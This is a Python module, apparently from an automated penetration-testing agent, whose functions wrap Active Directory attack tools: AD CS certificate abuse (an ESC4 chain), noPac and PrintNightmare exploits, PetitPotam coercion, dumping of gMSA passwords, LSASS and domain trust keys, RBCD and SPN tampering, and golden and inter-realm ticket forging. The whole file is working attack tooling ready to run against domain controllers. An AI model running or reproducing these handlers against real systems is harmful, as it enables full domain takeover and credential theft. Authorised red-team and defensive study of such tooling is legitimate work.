"""PRIVESC 阶段工具 handler：AD CS 攻击、CVE 利用、Kerberos 滥用、票据伪造。"""

from __future__ import annotations

from typing import Any

from .executor import CommandBuilder, exec_builder, precheck


def _certipy_auth(args: dict) -> list:
    """certipy 通用认证参数 -u/-p/-hash/-d/-dc-ip。"""
    out: list = []
    if args.get("username"):
        out += ["-u", str(args["username"])]
    if args.get("hash"):
        out += ["-hash", str(args["hash"])]
    elif args.get("password"):
        out += ["-p", str(args["password"])]
    if args.get("domain"):
        out += ["-d", str(args["domain"])]
    if args.get("target"):
        out += ["-dc-ip", str(args["target"])]
    return out


def _imp_spec(args: dict) -> str:
    """impacket domain/user:pass@target 形式（不含 hash）。"""
    user = args.get("username", "")
    domain = args.get("domain", "")
    pwd = args.get("password", "")
    target = args.get("target", "")
    du = f"{domain}/{user}" if (domain and user) else user
    if du and pwd:
        return f"{du}:{pwd}@{target}"
    if du:
        return f"{du}@{target}"
    return target


async def certipy_find(args: dict, state: Any = None) -> str:
    """certipy find 枚举 AD CS 漏洞。"""
    err, args = precheck("certipy_find", args, state)
    if err:
        return err
    cb = CommandBuilder("certipy").args("find", *_certipy_auth(args))
    if args.get("vulnerable"):
        cb.args("-vulnerable")
    cb.args("-stdout").timeout_secs(300)
    return await exec_builder(cb)


async def certipy_request(args: dict, state: Any = None) -> str:
    """certipy req 申请证书。"""
    err, args = precheck("certipy_request", args, state)
    if err:
        return err
    cb = CommandBuilder("certipy").args("req", *_certipy_auth(args))
    if args.get("ca"):
        cb.args("-ca", str(args["ca"]))
    if args.get("template"):
        cb.args("-template", str(args["template"]))
    if args.get("alt_name"):
        cb.args("-alt", str(args["alt_name"]))
    if args.get("upn"):
        cb.args("-upn", str(args["upn"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def certipy_auth(args: dict, state: Any = None) -> str:
    """certipy auth 用 pfx 获取 TGT。"""
    err, args = precheck("certipy_auth", args, state)
    if err:
        return err
    cb = CommandBuilder("certipy").args("auth")
    if args.get("pfx"):
        cb.args("-pfx", str(args["pfx"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("target"):
        cb.args("-dc-ip", str(args["target"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def certipy_shadow(args: dict, state: Any = None) -> str:
    """certipy shadow 操作（auth/auto/list/clone）。"""
    err, args = precheck("certipy_shadow", args, state)
    if err:
        return err
    action = args.get("action") or "auto"
    cb = CommandBuilder("certipy").args("shadow", str(action), *_certipy_auth(args))
    if args.get("account"):
        cb.args("-account", str(args["account"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def certipy_template_esc4(args: dict, state: Any = None) -> str:
    """certipy template 修改可写模板（ESC4）。"""
    err, args = precheck("certipy_template_esc4", args, state)
    if err:
        return err
    cb = CommandBuilder("certipy").args("template", *_certipy_auth(args))
    if args.get("template"):
        cb.args("-template", str(args["template"]))
    if args.get("save"):
        cb.args("-save", str(args["save"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def certipy_esc4_full_chain(args: dict, state: Any = None) -> str:
    """ESC4 全链：改模板 -> 申请证书 -> 认证。"""
    err, args = precheck("certipy_esc4_full_chain", args, state)
    if err:
        return err
    cb1 = CommandBuilder("certipy").args("template", *_certipy_auth(args))
    if args.get("template"):
        cb1.args("-template", str(args["template"]))
    cb1.args("-save-old").timeout_secs(180)
    out1 = await exec_builder(cb1)
    cb2 = CommandBuilder("certipy").args("req", *_certipy_auth(args))
    if args.get("ca"):
        cb2.args("-ca", str(args["ca"]))
    if args.get("template"):
        cb2.args("-template", str(args["template"]))
    if args.get("alt_name"):
        cb2.args("-alt", str(args["alt_name"]))
    cb2.timeout_secs(180)
    out2 = await exec_builder(cb2)
    return out1 + "\n\n[req]\n" + out2


async def gmsa_dump_passwords(args: dict, state: Any = None) -> str:
    """gMSADumper 转储 gMSA 密码。"""
    err, args = precheck("gmsa_dump_passwords", args, state)
    if err:
        return err
    cb = CommandBuilder("gMSADumper.py")
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    elif args.get("hash"):
        cb.args("-p", str(args["hash"]))
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("target"):
        cb.args("-l", str(args["target"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def nopac(args: dict, state: Any = None) -> str:
    """noPac.py (CVE-2021-42278/42287) 检测/利用。"""
    err, args = precheck("nopac", args, state)
    if err:
        return err
    cb = CommandBuilder("noPac.py").args(_imp_spec(args), "-use-ldap").timeout_secs(180)
    return await exec_builder(cb)


async def printnightmare(args: dict, state: Any = None) -> str:
    """CVE-2021-1675 PrintNightmare 远程加载 DLL。"""
    err, args = precheck("printnightmare", args, state)
    if err:
        return err
    dll = args.get("dll_path") or "\\\\localhost\\share\\evil.dll"
    cb = CommandBuilder("CVE-2021-1675.py").args(_imp_spec(args), str(dll)).timeout_secs(120)
    return await exec_builder(cb)


async def petitpotam_unauth(args: dict, state: Any = None) -> str:
    """PetitPotam 未认证强制认证（CVE-2021-36942）。"""
    err, args = precheck("petitpotam_unauth", args, state)
    if err:
        return err
    listener = args.get("listener_ip", "")
    target = args.get("target", "")
    cb = CommandBuilder("impacket-petitpotam").args("-u", "", "-p", "", listener, target).timeout_secs(60)
    return await exec_builder(cb)


async def unconstrained_tgt_dump(args: dict, state: Any = None) -> str:
    """转储目标主机上的 TGT 票据（非约束委派场景）。"""
    err, args = precheck("unconstrained_tgt_dump", args, state)
    if err:
        return err
    cb = CommandBuilder("lsassy")
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    cb.args(args.get("target", "")).timeout_secs(180)
    return await exec_builder(cb)


async def unconstrained_coerce_and_capture(args: dict, state: Any = None) -> str:
    """强制 DC 向监听机发起认证（PetitPotam -> ntlmrelayx 捕获）。"""
    err, args = precheck("unconstrained_coerce_and_capture", args, state)
    if err:
        return err
    listener = args.get("listener_ip", "")
    target = args.get("target", "")
    cb = CommandBuilder("impacket-petitpotam").args(listener, target)
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("password"):
        cb.args("-p", str(args["password"]))
    cb.timeout_secs(60)
    return await exec_builder(cb)


async def addspn(args: dict, state: Any = None) -> str:
    """addspn.py 修改目标用户 SPN。"""
    err, args = precheck("addspn", args, state)
    if err:
        return err
    cb = CommandBuilder("addspn.py")
    if args.get("domain") and args.get("username"):
        cb.args("-u", f"{args['domain']}/{args['username']}")
    if args.get("hash"):
        cb.args("-p", str(args["hash"]))
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("target"):
        cb.args("-dc-host", str(args["target"]))
    if args.get("target_user"):
        cb.args("-t", str(args["target_user"]))
    if args.get("spn"):
        cb.args("-s", str(args["spn"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def dnstool(args: dict, state: Any = None) -> str:
    """dnstool.py 操作 AD DNS 记录（添加 wildcard / RBAC）。"""
    err, args = precheck("dnstool", args, state)
    if err:
        return err
    cb = CommandBuilder("dnstool.py")
    if args.get("domain") and args.get("username"):
        cb.args("-u", f"{args['domain']}/{args['username']}")
    if args.get("hash"):
        cb.args("-p", str(args["hash"]))
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    cb.args(args.get("target", ""))
    if args.get("action"):
        cb.args("-a", str(args["action"]))
    if args.get("record"):
        cb.args("-r", str(args["record"]))
    if args.get("data"):
        cb.args("-d", str(args["data"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def find_delegation(args: dict, state: Any = None) -> str:
    """findDelegation.py 枚举委派配置。"""
    err, args = precheck("find_delegation", args, state)
    if err:
        return err
    cb = CommandBuilder("findDelegation.py")
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("target"):
        cb.args("-dc-ip", str(args["target"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def s4u_attack(args: dict, state: Any = None) -> str:
    """s4u.py 构造 S4U2Self/S4U2Proxy 票据。"""
    err, args = precheck("s4u_attack", args, state)
    if err:
        return err
    cb = CommandBuilder("s4u.py")
    if args.get("domain") and args.get("username"):
        cb.args(f"{args['domain']}/{args['username']}")
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("impersonate"):
        cb.args("-impersonate", str(args["impersonate"]))
    if args.get("service"):
        cb.args("-service", str(args["service"]))
    if args.get("target"):
        cb.args("-dc-ip", str(args["target"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def krbrelayup(args: dict, state: Any = None) -> str:
    """KrbRelayUp 本地提权（域内主机）。"""
    err, args = precheck("krbrelayup", args, state)
    if err:
        return err
    cb = CommandBuilder("krbrelayup")
    if args.get("domain"):
        cb.args("--domain", str(args["domain"]))
    if args.get("username"):
        cb.args("--user", str(args["username"]))
    if args.get("password"):
        cb.args("--password", str(args["password"]))
    cb.args("relay").timeout_secs(120)
    return await exec_builder(cb)


async def raise_child(args: dict, state: Any = None) -> str:
    """raiseChild.py 子域提升至父域域管。"""
    err, args = precheck("raise_child", args, state)
    if err:
        return err
    cb = CommandBuilder("raiseChild.py").args(_imp_spec(args))
    if args.get("child_domain"):
        cb.args("-child", str(args["child_domain"]))
    if args.get("parent_domain"):
        cb.args("-parent", str(args["parent_domain"]))
    cb.timeout_secs(180)
    return await exec_builder(cb)


async def generate_golden_ticket(args: dict, state: Any = None) -> str:
    """impacket-ticketer 伪造黄金票据。"""
    err, args = precheck("generate_golden_ticket", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-ticketer")
    if args.get("krbtgt_hash"):
        cb.args("-nthash", str(args["krbtgt_hash"]))
    if args.get("domain"):
        cb.args("-domain", str(args["domain"]))
    if args.get("sid"):
        cb.args("-domain-sid", str(args["sid"]))
    if args.get("user"):
        cb.args("-user", str(args["user"]))
    cb.args("-id", "500").timeout_secs(60)
    return await exec_builder(cb)


async def add_computer(args: dict, state: Any = None) -> str:
    """impacket-addcomputer 添加机器账户（RBCD/SPN 前置）。"""
    err, args = precheck("add_computer", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-addcomputer").args(_imp_spec(args))
    if args.get("computer_name"):
        cb.args("-computer-name", str(args["computer_name"]))
    if args.get("computer_password"):
        cb.args("-computer-pass", str(args["computer_password"]))
    if args.get("target"):
        cb.args("-dc-ip", str(args["target"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def rbcd_write(args: dict, state: Any = None) -> str:
    """rbcd.py 写入 RBCD 委派属性。"""
    err, args = precheck("rbcd_write", args, state)
    if err:
        return err
    cb = CommandBuilder("rbcd.py")
    if args.get("domain"):
        cb.args("-d", str(args["domain"]))
    if args.get("username"):
        cb.args("-u", str(args["username"]))
    if args.get("hash"):
        cb.args("-hash", str(args["hash"]))
    elif args.get("password"):
        cb.args("-p", str(args["password"]))
    if args.get("target"):
        cb.args("-dc-ip", str(args["target"]))
    if args.get("delegate_to"):
        cb.args("-delegate-to", str(args["delegate_to"]))
    if args.get("delegate_from"):
        cb.args("-delegate-from", str(args["delegate_from"]))
    cb.timeout_secs(120)
    return await exec_builder(cb)


async def extract_trust_key(args: dict, state: Any = None) -> str:
    """提取域信任密钥（secretsdump 过滤 trust 账户）。"""
    err, args = precheck("extract_trust_key", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-secretsdump")
    if args.get("hash"):
        cb.args("-hashes", f":{args['hash']}")
    cb.args(_imp_spec(args)).timeout_secs(300)
    out = await exec_builder(cb)
    # 过滤出信任账户行
    lines = [ln for ln in out.splitlines() if "$" in ln or "trust" in ln.lower()]
    return "\n".join(lines) if lines else out


async def create_inter_realm_ticket(args: dict, state: Any = None) -> str:
    """impacket-ticketer 构造跨域票据。"""
    err, args = precheck("create_inter_realm_ticket", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-ticketer")
    if args.get("trust_key"):
        cb.args("-nthash", str(args["trust_key"]))
    if args.get("domain"):
        cb.args("-domain", str(args["domain"]))
    if args.get("sid"):
        cb.args("-domain-sid", str(args["sid"]))
    if args.get("user"):
        cb.args("-user", str(args["user"]))
    if args.get("target_domain"):
        cb.args("-extra-sid", str(args.get("target_domain", "")))
    cb.timeout_secs(60)
    return await exec_builder(cb)


async def get_sid(args: dict, state: Any = None) -> str:
    """impacket-lookupsid 获取域 SID。"""
    err, args = precheck("get_sid", args, state)
    if err:
        return err
    cb = CommandBuilder("impacket-lookupsid").args(_imp_spec(args), "0").timeout_secs(60)
    return await exec_builder(cb)


__all__ = [
    "certipy_find", "certipy_request", "certipy_auth", "certipy_shadow",
    "certipy_template_esc4", "certipy_esc4_full_chain", "gmsa_dump_passwords",
    "nopac", "printnightmare", "petitpotam_unauth", "unconstrained_tgt_dump",
    "unconstrained_coerce_and_capture", "addspn", "dnstool", "find_delegation",
    "s4u_attack", "krbrelayup", "raise_child", "generate_golden_ticket",
    "add_computer", "rbcd_write", "extract_trust_key",
    "create_inter_realm_ticket", "get_sid",
]
